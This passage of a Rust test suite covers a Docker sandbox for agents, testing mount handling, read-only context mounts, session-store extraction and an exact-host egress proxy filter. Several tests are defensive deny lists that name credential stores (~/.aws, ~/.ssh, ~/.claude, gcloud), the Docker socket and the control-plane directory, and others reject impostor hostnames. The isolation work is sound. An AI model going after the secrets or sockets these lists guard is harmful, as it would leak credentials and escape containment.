                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert_eq!(
            mount_values(&wrapped),
            vec![
                "/srv/app:/srv/app".to_owned(),
                "varda-sbx-s1:/home/agent".to_owned(),
                "/ctx/adb:/ctx/adb:ro".to_owned(),
            ]
        );
    }

    /// M6a exit criterion: an explicit-target route mount maps to
    /// `-v SOURCE:/context/adb:ro`.
    #[test]
    fn route_mount_explicit_target_reaches_argv() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![(MountOrigin::Route, "/host/adb:/context/adb".to_owned())],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert!(
            mount_values(&wrapped).contains(&"/host/adb:/context/adb:ro".to_owned()),
            "expected explicit-target mount, got {:?}",
            mount_values(&wrapped)
        );
    }

    /// M6a: `{project}` expansion and project-root-relative sources (no env
    /// mutation, so this test is isolated). `~` expansion is covered directly
    /// against the ambient HOME below.
    #[test]
    fn route_mount_expands_project_and_relative() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![
                (MountOrigin::Route, "{project}/vendor:/vendor:ro".to_owned()),
                (MountOrigin::Route, "subdir:ro".to_owned()),
            ],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let values = mount_values(&wrapped);
        assert!(values.contains(&"/srv/app/vendor:/vendor:ro".to_owned()));
        assert!(values.contains(&"/srv/app/subdir:/srv/app/subdir:ro".to_owned()));
    }

    /// M6a: `~` expands against HOME. Read (never mutate) the ambient HOME so
    /// this test does not perturb the shared test process env.
    #[test]
    fn expand_mount_path_expands_tilde_against_home() {
        let Some(home) = std::env::var_os("HOME") else {
            return; // No HOME in this environment; nothing to assert.
        };
        let home = PathBuf::from(home);
        let expanded = expand_mount_path(Path::new("~/notes"), Path::new("/srv/app"));
        assert_eq!(expanded, home.join("notes"));
    }

    /// M6a: effective mounts = union(sandbox, route), de-duplicated by target.
    /// A sandbox and a route mount claiming the same target collapse to one
    /// (first origin — sandbox — wins), while distinct targets both appear.
    #[test]
    fn effective_mounts_union_dedups_by_target() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![
                (MountOrigin::Sandbox, "/shared:/context:ro".to_owned()),
                (MountOrigin::Route, "/other:/context:w".to_owned()),
                (MountOrigin::Route, "/extra:ro".to_owned()),
            ],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let values = mount_values(&wrapped);
        // Same target `/context` de-duped to the sandbox origin's ro mount.
        assert!(values.contains(&"/shared:/context:ro".to_owned()));
        assert!(!values.iter().any(|v| v == "/other:/context"));
        // The distinct target still appears.
        assert!(values.contains(&"/extra:/extra:ro".to_owned()));
    }

    /// M6b: `merge_mount_origins` composes the three origins into one origin-tagged
    /// set (union), Sandbox → Route → Varda in that order; the provider carries the
    /// merged set verbatim.
    #[test]
    fn merge_mount_origins_unions_all_three_origins() {
        let mounts = merge_mount_origins(
            &["/img/cache".to_owned()],
            &["~/dev/brain/AsianDevBank:ro".to_owned()],
            &["/proj/ctx:/ctx:ro".to_owned()],
        );
        let expected = vec![
            (MountOrigin::Sandbox, "/img/cache".to_owned()),
            (MountOrigin::Route, "~/dev/brain/AsianDevBank:ro".to_owned()),
            (MountOrigin::Varda, "/proj/ctx:/ctx:ro".to_owned()),
        ];
        assert_eq!(mounts, expected);

        let provider = DockerProvider::from_config(
            "docker",
            &SandboxConfig {
                image: Some("img".to_owned()),
                ..Default::default()
            },
            mounts,
        )
        .unwrap();
        assert_eq!(provider.mounts, expected);
    }

    /// M6b: an (already-hardened) `.varda` mount carried as a `Varda` origin
    /// reaches the produced `docker run` argv as a `-v …:ro` entry — the live-wire
    /// proof that the untrusted origin is applied, not silently dropped.
    #[test]
    fn varda_origin_mount_appears_in_docker_argv() {
        let session = DockerSession::for_test(
            "img",
            "/srv/app",
            vec![(MountOrigin::Varda, "/srv/app/ctx:/ctx:ro".to_owned())],
            vec![],
            "/var/varda/sessions/s1",
        );
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let values = mount_values(&wrapped);
        assert!(
            values.contains(&"/srv/app/ctx:/ctx:ro".to_owned()),
            "Varda-origin mount missing from argv: {values:?}"
        );
    }

    /// M6b: the credential denylist is enforced on the FULL merged set at
    /// validate time — even a TRUSTED central-config (`Sandbox` origin) mount of a
    /// credential dir such as `~/.aws` is refused at launch, not only `.varda`.
    #[test]
    fn validate_mounts_rejects_credential_source_all_origins() {
        let Some(home) = std::env::var_os("HOME") else {
            return; // No HOME in this environment; nothing to assert.
        };
        let aws = PathBuf::from(&home).join(".aws");
        let real_project = std::env::temp_dir().display().to_string();
        let session = DockerSession::for_test(
            "img",
            &real_project,
            vec![(MountOrigin::Sandbox, format!("{}:/aws:ro", aws.display()))],
            vec![],
            "/var/varda/sessions/s1",
        );
        let err = session
            .validate_mounts()
            .expect_err("a trusted-config mount of ~/.aws must be refused");
        assert!(
            err.to_string().contains("credential/identity store"),
            "unexpected error: {err:#}"
        );
    }

    /// M6a docker integration: a route context mount is visible READ-ONLY inside
    /// the container — a write attempt fails. Requires a docker daemon.
    #[tokio::test]
    #[ignore = "requires docker"]
    async fn docker_route_mount_is_read_only() {
        use tokio::process::Command as TokioCommand;

        // A host dir to expose read-only as a route context mount. It must live
        // under a path the docker VM can actually see: on a hardened Colima that
        // mounts only ~/dev, sources outside it bind as empty stubs. The repo
        // (CARGO_MANIFEST_DIR) is under the developer's mounted tree, so use its
        // target/ dir rather than ~/.varda (which may be unmounted in the VM).
        let ctx_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("m6a-ro-probe");
        std::fs::create_dir_all(&ctx_dir).unwrap();
        std::fs::write(ctx_dir.join("seed.txt"), b"seed").unwrap();
        let ctx_str = ctx_dir.display().to_string();

        let provider = DockerProvider::from_config(
            "docker",
            &SandboxConfig {
                image: Some("busybox".to_owned()),
                ..Default::default()
            },
            vec![(MountOrigin::Route, format!("{ctx_str}:/context:ro"))],
        )
        .unwrap();
        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("m6a-proj");
        std::fs::create_dir_all(&root).unwrap();
        docker_cleanup("ro-mount-1").await;
        let session = provider
            .prepare(&ctx_with_id(&root, "ro-mount-1"))
            .await
            .unwrap();

        // Reading the mounted file succeeds; writing into it fails (ro).
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                        "-c".to_owned(),
                        "cat /context/seed.txt && ! (echo x > /context/probe.txt)".to_owned(),
                    ],
                    env: BTreeMap::new(),
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let status = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .status()
            .await
            .expect("failed to run docker");
        // Tear down (remove the named container/volume) before asserting so a
        // failure never leaks docker resources for the next run.
        session.teardown().await.ok();
        assert!(
            status.success(),
            "read should succeed and write should fail under a read-only route mount"
        );
    }

    /// M9 exit criterion — the REAL host round-trip the earlier tests never
    /// checked. An agent writes its session store under `$HOME` (a per-session
    /// docker VOLUME, not a host bind), and Varda must read it back FROM THE HOST
    /// via `docker cp`. This works even on a VM-backed daemon whose share excludes
    /// `~/.varda` (the Colima `~/dev`-only case that silently broke the M3 bind).
    #[tokio::test]
    #[ignore = "requires docker"]
    async fn docker_session_store_round_trips_to_host_via_volume() {
        use tokio::process::Command as TokioCommand;

        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("m9-rt-proj");
        std::fs::create_dir_all(&root).unwrap();
        docker_cleanup("store-rt-1").await;

        let provider = DockerProvider::from_config(
            "docker",
            &SandboxConfig {
                image: Some("busybox".to_owned()),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let session = provider
            .prepare(&ctx_with_id(&root, "store-rt-1"))
            .await
            .unwrap();
        let store = session.session_store_root().expect("docker store root");
        std::fs::create_dir_all(&store).unwrap();

        // Simulate the agent writing a session-store file under HOME (the volume).
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                    "-c".to_owned(),
                    "mkdir -p \"$HOME/.claude\" && echo hi > \"$HOME/.claude/transcript.jsonl\""
                        .to_owned(),
                ],
                    env: BTreeMap::new(),
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let status = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .status()
            .await
            .expect("failed to run docker");

        // Extract the store from the volume to the HOST, capture the outcome, then
        // ALWAYS tear down before asserting so a failure never leaks resources.
        let extracted = if status.success() {
            session.extract_session_store().await
        } else {
            Ok(())
        };
        let host_file = store.join(".claude/transcript.jsonl");
        let got = std::fs::read_to_string(&host_file);
        session.teardown().await.ok();

        assert!(status.success(), "container write should succeed");
        extracted.expect("docker cp extraction should succeed");
        assert_eq!(
            got.expect("session-store file must exist on the host after extraction")
                .trim(),
            "hi",
            "the session store must round-trip container→host via the volume + docker cp"
        );
    }

    #[test]
    fn credential_denylist_rejects_secret_dirs_all_origins() {
        let home = std::env::var("HOME").expect("HOME set in tests");
        for entry in ["/.aws", "/.ssh", "/.claude", "/.config/gcloud"] {
            let src = PathBuf::from(format!("{home}{entry}"));
            assert!(
                check_credential_denylist(&src).is_err(),
                "expected {entry} to be denied"
            );
        }
        // A neutral path is allowed.
        assert!(check_credential_denylist(Path::new("/tmp/somewhere")).is_ok());
    }

    #[test]
    fn control_plane_denylist_rejects_docker_socket_all_paths_and_basenames() {
        // Invariant 1: the well-known daemon sockets are refused.
        for sock in DOCKER_SOCKET_PATHS {
            assert!(
                check_control_plane_denylist(Path::new(sock)).is_err(),
                "expected docker socket {sock} to be denied"
            );
        }
        // A re-targeted mount of the socket by any path is caught by basename.
        assert!(
            check_control_plane_denylist(Path::new("/tmp/sneaky/docker.sock")).is_err(),
            "docker.sock by any path must be denied"
        );
        // Folded into the general credential check too (covers every call site).
        assert!(check_credential_denylist(Path::new("/var/run/docker.sock")).is_err());
    }

    #[test]
    fn control_plane_denylist_rejects_varda_control_plane_all_origins() {
        let home = std::env::var("HOME").expect("HOME set in tests");
        // Invariant 2: `~/.varda` and anything under it is refused.
        assert!(check_control_plane_denylist(&PathBuf::from(format!("{home}/.varda"))).is_err());
        assert!(
            check_control_plane_denylist(&PathBuf::from(format!("{home}/.varda/operations")))
                .is_err()
        );
        // And via the general credential check used at every mount call site.
        assert!(check_credential_denylist(&PathBuf::from(format!("{home}/.varda"))).is_err());
        // A neutral path is still allowed.
        assert!(check_control_plane_denylist(Path::new("/tmp/somewhere")).is_ok());
    }

    #[test]
    fn identity_context_requires_readonly_file_and_no_creds() {
        let dir = std::env::temp_dir().join(format!("varda-identity-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let profile = dir.join("CLAUDE.md");
        std::fs::write(&profile, "# profile\n").unwrap();

        // A credential filename is refused even as a curated identity mount.
        let credential = dir.join(".credentials.json");
        std::fs::write(&credential, "{}").unwrap();
        assert!(check_identity_context_mount(&credential, false).is_err());
        // Writable is refused.
        assert!(check_identity_context_mount(&profile, true).is_err());
        // Missing paths are refused so docker/msb do not create empty bind stubs.
        assert!(check_identity_context_mount(&dir.join("missing.md"), false).is_err());
        // A read-only existing non-credential file is accepted.
        assert!(check_identity_context_mount(&profile, false).is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn validate_mounts_rejects_missing_identity_context_file() {
        let project = std::env::temp_dir();
        let session = DockerSession::for_test_with_identity(
            "img",
            &project.display().to_string(),
            "/var/varda/sessions/s1",
            SandboxIdentity {
                identity_context: vec![
                    project
                        .join("definitely-missing-identity.md")
                        .display()
                        .to_string(),
                ],
                ..Default::default()
            },
        );
        let err = session
            .validate_mounts()
            .expect_err("missing identity_context file must fail validation");
        assert!(
            err.to_string().contains("existing specific FILE"),
            "unexpected error: {err:#}"
        );
    }

    #[test]
    fn harden_rejects_project_collision_and_forces_ro() {
        let root = std::env::temp_dir().join(format!("varda-harden-{}", std::process::id()));
        let _ = std::fs::create_dir_all(root.join("ctx"));
        // TARGET colliding with the project root is refused.
        let colliding = MountSpec {
            source: root.join("ctx"),
            target: root.clone(),
            writable: false,
        };
        assert!(harden_varda_mount(&colliding, &root, false, Path::new("/x/.varda")).is_err());
        // Writable clamped to read-only when not allowed.
        let ok = MountSpec {
            source: root.join("ctx"),
            target: PathBuf::from("/ctx"),
            writable: true,
        };
        let out = harden_varda_mount(&ok, &root, false, Path::new("/x/.varda")).unwrap();
        assert!(!out.writable);
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn worktree_gitdir_must_be_visible_at_its_absolute_guest_path() {
        let root = std::env::temp_dir().join(format!(
            "varda-worktree-gitdir-{}-{}",
            std::process::id(),
            &uuid::Uuid::new_v4().to_string()[..8]
        ));
        let mother_git = root.join("mother/.git");
        let project = root.join("worker");
        let gitdir = mother_git.join("worktrees/worker");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(&gitdir).unwrap();
        std::fs::write(gitdir.join("commondir"), "../..\n").unwrap();
        std::fs::write(
            project.join(".git"),
            format!("gitdir: {}\n", gitdir.display()),
        )
        .unwrap();

        let err = ensure_worktree_gitdir_visible(&project, &[])
            .expect_err("the project mount alone cannot resolve an external gitdir");
        assert!(err.to_string().contains("refusing to launch git worktree"));
        assert!(err.to_string().contains(&gitdir.display().to_string()));

        let same_path_mount = vec![(
            MountOrigin::Sandbox,
            format!("{}:{}:ro", mother_git.display(), mother_git.display()),
        )];
        ensure_worktree_gitdir_visible(&project, &same_path_mount)
            .expect("a same-path mother .git mount makes the pointer resolvable");

        let metadata_only_mount = vec![(
            MountOrigin::Sandbox,
            format!("{}:{}:ro", gitdir.display(), gitdir.display()),
        )];
        ensure_worktree_gitdir_visible(&project, &metadata_only_mount)
            .expect_err("per-worktree metadata alone omits the shared object database and refs");

        let remapped_mount = vec![(
            MountOrigin::Sandbox,
            format!("{}:/git:ro", mother_git.display()),
        )];
        ensure_worktree_gitdir_visible(&project, &remapped_mount)
            .expect_err("mounting the content at another path does not satisfy the pointer");

        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn ordinary_repository_does_not_trigger_worktree_guard() {
        let root = std::env::temp_dir().join(format!(
            "varda-ordinary-gitdir-{}-{}",
            std::process::id(),
            &uuid::Uuid::new_v4().to_string()[..8]
        ));
        std::fs::create_dir_all(root.join(".git")).unwrap();
        ensure_worktree_gitdir_visible(&root, &[])
            .expect("a self-contained .git directory is carried by the project mount");
        let _ = std::fs::remove_dir_all(root);
    }

    #[cfg(unix)]
    #[test]
    fn worktree_guard_preserves_symlinked_guest_path_spelling() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join(format!(
            "varda-symlink-gitdir-{}-{}",
            std::process::id(),
            &uuid::Uuid::new_v4().to_string()[..8]
        ));
        let real_mother = root.join("real");
        let linked_mother = root.join("linked");
        let project = root.join("worker");
        let real_gitdir = real_mother.join(".git/worktrees/worker");
        std::fs::create_dir_all(&real_gitdir).unwrap();
        std::fs::create_dir_all(&project).unwrap();
        symlink(&real_mother, &linked_mother).unwrap();
        let linked_gitdir = linked_mother.join(".git/worktrees/worker");
        std::fs::write(linked_gitdir.join("commondir"), "../..\n").unwrap();
        std::fs::write(
            project.join(".git"),
            format!("gitdir: {}\n", linked_gitdir.display()),
        )
        .unwrap();
        let mounts = vec![(
            MountOrigin::Sandbox,
            format!(
                "{}:{}:ro",
                linked_mother.join(".git").display(),
                linked_mother.join(".git").display()
            ),
        )];

        ensure_worktree_gitdir_visible(&project, &mounts)
            .expect("matching symlinked host and guest spellings are resolvable in the guest");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn tinyproxy_filter_is_exact_host_only() {
        let filter = tinyproxy_filter(&["api.anthropic.com".to_owned()]);
        // Each declared host becomes an exact-anchored ERE line: `.` is escaped to a
        // literal dot and the pattern is anchored at BOTH ends (`^…$`) so tinyproxy's
        // extended-regex filter admits ONLY the literal host — never a subdomain or a
        // suffix-match impostor. A leading-dot alternative (`(^|\.)host$`) would admit
        // subdomains; anchoring at `^` forbids that.
        assert_eq!(filter, "^api\\.anthropic\\.com$\n");

        // Emulate the full-string ERE match tinyproxy performs for our exact-anchored
        // patterns: an `^…$` pattern with every `.` escaped matches iff the candidate
        // equals the literal host (unescape `\.`, drop the `^`/`$`, compare whole string).
        let ere_full_match = |pattern: &str, candidate: &str| -> bool {
            let literal = pattern
                .trim_start_matches('^')
                .trim_end_matches('$')
                .replace("\\.", ".");
            candidate == literal
        };
        let pattern = filter.trim_end();

        // The exact declared host is allowed.
        assert!(ere_full_match(pattern, "api.anthropic.com"));
        // A subdomain of a declared host is NOT allowed.
        assert!(!ere_full_match(pattern, "evil.api.anthropic.com"));
        // A suffix-match impostor is NOT allowed.
        assert!(!ere_full_match(pattern, "api.anthropic.com.evil.com"));
        // An unrelated host is NOT allowed.
        assert!(!ere_full_match(pattern, "example.com"));

        // Multiple declared hosts produce one exact-anchored line each.
        let multi = tinyproxy_filter(&["a.example.com".to_owned(), "b.example.com".to_owned()]);
        assert_eq!(multi, "^a\\.example\\.com$\n^b\\.example\\.com$\n");
    }
}
